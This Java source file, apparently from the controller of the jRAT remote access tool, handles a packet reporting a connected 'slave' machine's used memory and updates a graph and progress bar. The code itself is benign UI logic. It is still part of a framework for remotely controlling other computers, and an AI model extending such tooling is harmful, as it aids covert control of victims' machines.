package jrat.module.system.packets;

import jrat.common.utils.MathUtils;
import jrat.controller.Slave;
import jrat.controller.packets.incoming.IncomingPacket;
import jrat.module.system.ui.PanelMemoryUsage;

public class Packet24UsedMemory implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		long used = slave.readLong();

        PanelMemoryUsage panel = (PanelMemoryUsage) slave.getPanel(PanelMemoryUsage.class);
		
		if (panel != null) {

			if (panel != null) {
				panel.getGraph().addValues(used, slave.getMemory());
                panel.getGraph().repaint();
				panel.getProgressBar().setValue(MathUtils.getPercentFromTotal(used, slave.getMemory()));
			}
		}
	}
}
